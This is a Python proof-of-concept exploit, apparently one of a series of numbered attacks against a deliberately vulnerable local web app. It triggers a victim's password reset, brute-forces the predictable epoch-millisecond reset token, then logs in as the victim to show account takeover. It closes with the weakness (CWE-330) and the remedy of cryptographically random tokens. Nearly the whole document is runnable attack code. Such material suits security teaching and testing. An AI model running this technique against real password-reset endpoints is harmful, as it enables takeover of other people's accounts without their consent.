"""
Attack #5 — WEAK, PREDICTABLE RESET SECRETS  (CWE-330 / CWE-640)
Target: /forgot-password + /reset-password on the vulnerable app (127.0.0.1:5000)

Premise
-------
The reset secrets are not cryptographically random:

    otp   = str(random.randint(0, 999999)).zfill(6)   # non-crypto Mersenne PRNG
    token = str(int(time.time() * 1000))              # just the current epoch-ms

The TOKEN is the fatal one: it is fully determined by the wall-clock time at
the instant the reset was requested. An attacker who triggers a victim's
reset knows that instant to within a few milliseconds, so the token lives in
a search space of only a few hundred integers -- trivially brute-forced.

Crucially this needs NO access to the victim's email. The attacker never
reads the outbox; they reconstruct the token from time alone and drive
/reset-password directly.

(The 6-digit OTP is also weak -- only 10^6 and drawn from a predictable PRNG
rather than `secrets` -- and attack #7 brute-forces it directly. This script
focuses on the token, the more complete break.)

What this script proves
-----------------------
1. Trigger the victim's reset, bracketing the moment with local timestamps.
2. WITHOUT reading the outbox, scan the small epoch-ms window and find the
   valid token by driving /reset-password until one guess takes.
3. Log in as the victim with the attacker-chosen password.
4. Only afterwards, reveal the real token from the outbox to confirm the
   predicted value matched.

Runs unmodified against a fresh instance.
"""

import time
import requests

BASE = "http://127.0.0.1:5000"
VICTIM = "victim@corp.example"
NEW_PW = "predicted_token_pwn_1"


def main():
    print("=" * 68)
    print("ATTACK #5 - Predictable time-based reset token (brute force)")
    print("Target:", BASE)
    print("=" * 68)

    # Step 1: trigger the victim's reset, bracketing server time with our
    # own clock (localhost -> same clock, so a tight bracket).
    t_before = int(time.time() * 1000)
    r = requests.post(f"{BASE}/forgot-password", json={"email": VICTIM})
    t_after = int(time.time() * 1000)
    print(f"\n[*] Triggered reset for {VICTIM} -> HTTP {r.status_code}")
    print(f"    token = int(time.time()*1000) was assigned between:")
    print(f"      {t_before}  and  {t_after}   (window = {t_after - t_before + 1} ms)")

    # Step 2: brute-force the millisecond window. A small pad on each side
    # absorbs any tiny clock skew. We NEVER read the outbox here.
    pad = 50
    lo, hi = t_before - pad, t_after + pad
    print(f"\n[*] Scanning candidate tokens {lo}..{hi} "
          f"({hi - lo + 1} guesses) against /reset-password -- no email access:")

    found = None
    tries = 0
    for cand in range(lo, hi + 1):
        tries += 1
        rr = requests.post(
            f"{BASE}/reset-password",
            json={"token": str(cand), "new_password": NEW_PW, "email": VICTIM},
        )
        if rr.status_code == 200:
            found = str(cand)
            print(f"    HIT after {tries} guesses: token = {found}")
            print(f"    server -> {rr.text.strip()}")
            break

    if not found:
        print("    [-] No token found in window - target does not appear vulnerable.")
        return

    # Step 3: confirm takeover.
    lr = requests.post(f"{BASE}/login", json={"email": VICTIM, "password": NEW_PW})
    print(f"\n[*] Login as victim with attacker's password -> "
          f"HTTP {lr.status_code}: {lr.text.strip()}")

    # Step 4: verification only -- reveal the true token now to show we
    # matched it WITHOUT having looked beforehand.
    real = requests.get(f"{BASE}/outbox").json()[VICTIM]["token"]
    print(f"\n[*] Verification - real token from outbox was: {real}")
    print(f"    predicted == real ? {found == real}")

    print("\n" + "-" * 68)
    print("[+] ATTACKER GAIN - reconstructed the reset token from time alone,")
    print(f"    in {tries} guesses, with zero access to the victim's mailbox,")
    print("    then took over the account. Tokens must be crypto-random. (CWE-330)")
    print("-" * 68)


if __name__ == "__main__":
    main()
